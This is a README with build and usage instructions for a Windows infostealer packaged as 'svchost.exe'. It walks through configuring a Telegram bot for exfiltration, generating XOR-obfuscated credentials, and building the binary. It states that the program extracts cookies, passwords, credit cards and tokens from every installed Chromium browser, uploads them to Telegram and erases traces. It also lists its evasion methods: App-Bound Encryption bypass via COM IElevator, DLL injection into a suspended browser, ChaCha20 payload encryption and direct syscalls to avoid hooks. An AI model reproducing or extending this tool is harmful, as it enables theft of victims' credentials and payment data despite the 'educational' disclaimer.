# Build Instructions

## Prerequisites

- Windows 10/11 (x64)
- Visual Studio 2019 or later with C++ Desktop Development workload
- Developer Command Prompt for VS

## Configuration

1. Copy the template configuration file:
```batch
copy config_template.json config.json
```

2. Edit `config.json` with your Telegram credentials:
```json
{
  "telegram": {
    "bot_token": "1234567890:ABCdefGHIjklMNOpqrsTUVwxyz",
    "channel_id": "1234567890"
  }
}
```

3. Generate the obfuscated configuration header:
```batch
python generate_config.py config.json
```

This will create `src/core/telegram_config.hpp` with XOR-encoded credentials.

## Build

Open Developer Command Prompt for VS and run:

```batch
make.bat
```

Output: `svchost.exe` (approximately 1.4 MB)

## Usage

Simply run the executable:

```batch
svchost.exe
```

The program will:
1. Extract data from all installed Chromium browsers
2. Create a ZIP archive in %TEMP%\tmp
3. Upload to Telegram
4. Clean up all traces

## Project Structure

```
src/
├── core/           # Core utilities (encryption, telegram, console)
├── crypto/         # Cryptographic functions (AES-GCM, ChaCha20)
├── com/            # COM Elevator for ABE decryption
├── sys/            # System API and syscalls
├── injector/       # Main injector and process management
├── payload/        # DLL payload for data extraction
└── tools/          # Build tools (encryptor)

libs/
└── sqlite/         # SQLite3 library

build/              # Build artifacts (generated)
```

## Technical Details

- Uses COM IElevator interface to decrypt App-Bound Encryption keys
- Injects payload DLL into suspended browser process
- Extracts cookies, passwords, credit cards, and tokens
- Encrypts payload with ChaCha20
- Uses direct syscalls to evade hooks
- No console window (GUI subsystem)
- Automatic cleanup after execution

## Notes

- Requires browsers to be closed during extraction
- Only works with Chromium-based browsers using App-Bound Encryption
- For educational and security research purposes only
